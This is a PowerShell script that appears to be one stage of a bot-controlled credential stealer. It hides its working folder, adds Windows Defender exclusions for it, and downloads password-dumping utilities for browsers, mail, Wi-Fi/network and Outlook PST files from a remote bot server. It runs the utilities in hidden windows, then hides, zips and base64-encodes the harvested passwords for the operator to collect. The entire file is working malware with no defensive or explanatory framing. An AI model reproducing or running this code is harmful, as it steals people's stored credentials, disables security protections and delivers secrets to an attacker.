$ErrorActionPreference = 'SilentlyContinue'
try { $PSNativeCommandUseErrorActionPreference = $false } catch {}
$toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\tools'
New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
cmd /c ('attrib +h +s "' + $toolsDir + '"') | Out-Null
cmd /c ('attrib +h +s "' + (Join-Path $env:LOCALAPPDATA 'HelperHost') + '"') | Out-Null

$base = $env:AGENTSHE_FILES
if (-not $base) {
  try {
    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
    if ($st) {
      $j = $st | ConvertFrom-Json
      if ($j.bot_base) { $base = ($j.bot_base.TrimEnd('/') + '/files') }
    }
  } catch {}
}
if (-not $base) {
  try {
    $cfg = Get-Content (Join-Path $env:LOCALAPPDATA 'HelperHost\config.json') -Raw | ConvertFrom-Json
    if ($cfg.bot_base) { $base = ($cfg.bot_base.TrimEnd('/') + '/files') }
  } catch {}
}
if (-not $base) { throw 'AGENTSHE_FILES / bot_base manquant' }
$base = $base.TrimEnd('/')

try {
  if (Get-Command Add-MpPreference -EA SilentlyContinue) {
    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue 2>$null | Out-Null
    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue 2>$null | Out-Null
  }
} catch {}

$tools = @(
  @{ id = 'chromepass'; leaf = 'ChromePass.exe'; rel = 'ChromePass.exe' },
  @{ id = 'webbrowser'; leaf = 'WebBrowserPassView.exe'; rel = 'WebBrowserPassView.exe' },
  @{ id = 'passwordfox'; leaf = 'PasswordFox.exe'; rel = 'x64/PasswordFox.exe'; rel32 = 'PasswordFox.exe' },
  @{ id = 'mailpv'; leaf = 'mailpv.exe'; rel = 'mailpv.exe' },
  @{ id = 'mspass'; leaf = 'mspass.exe'; rel = 'mspass.exe' },
  @{ id = 'netpass'; leaf = 'netpass.exe'; rel = 'x64/netpass.exe'; rel32 = 'netpass.exe' },
  @{ id = 'iepv'; leaf = 'iepv.exe'; rel = 'iepv.exe' },
  @{ id = 'dialupass'; leaf = 'Dialupass.exe'; rel = 'Dialupass.exe' },
  @{ id = 'pstpassword'; leaf = 'PstPassword.exe'; rel = 'PstPassword.exe' }
)
$files = @()
$errs = @()
foreach ($t in $tools) {
  try {
    $dest = Join-Path $toolsDir $t.leaf
    $url = "$base/tools/$($t.rel)"
    $url32 = if ($t.rel32) { "$base/tools/$($t.rel32)" } else { $url }
    if (-not [Environment]::Is64BitOperatingSystem) { $url = $url32 }
    if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
      & curl.exe -fsSL $url -o $dest 2>$null
      if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
        & curl.exe -fsSL $url32 -o $dest 2>$null
      }
    }
    if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
      throw 'download failed'
    }
    Unblock-File $dest -EA SilentlyContinue
    $zone = $dest + ':Zone.Identifier'
    if (Test-Path $zone) { Remove-Item $zone -Force -EA SilentlyContinue }
    $out = Join-Path $toolsDir ($t.id + '.txt')
    Remove-Item $out -Force -EA SilentlyContinue
    $p = $null
    try {
      $p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru -EA Stop
    } catch {
      throw ('AV_BLOCK: ' + $_.Exception.Message)
    }
    if ($null -ne $p) {
      if (-not $p.WaitForExit(45000)) {
        Stop-Process -Id $p.Id -Force -EA SilentlyContinue
        throw 'timeout'
      }
    } else {
      throw 'start failed'
    }
    Start-Sleep -Milliseconds 200
    if (-not (Test-Path $out)) {
      Set-Content -Path $out -Value '(aucune donnee)' -Encoding UTF8
    }
    cmd /c ('attrib +h +s "' + $dest + '"') | Out-Null
    cmd /c ('attrib +h +s "' + $out + '"') | Out-Null
    $files += $out
  } catch {
    $err = Join-Path $toolsDir ($t.id + '.err.txt')
    Set-Content -Path $err -Value ("$($t.id): " + $_.Exception.Message) -Encoding UTF8
    $files += $err
    $errs += $t.id
  }
}
$zip = Join-Path $toolsDir ('tools-export-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
Remove-Item $zip -Force -EA SilentlyContinue
if ($files.Count -eq 0) {
  $empty = Join-Path $toolsDir '_empty.txt'
  Set-Content $empty -Value 'aucun resultat' -Encoding UTF8
  $files = @($empty)
}
try {
  Compress-Archive -Path $files -DestinationPath $zip -Force
} catch {
  $zip = $files[0]
}
cmd /c ('attrib +h +s "' + $zip + '"') | Out-Null
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
Write-Output ('FILEB64:' + [IO.Path]::GetFileName($zip) + ':' + $b64)
if ($errs.Count -gt 0) {
  Write-Output ('ERRS:' + ($errs -join ','))
}
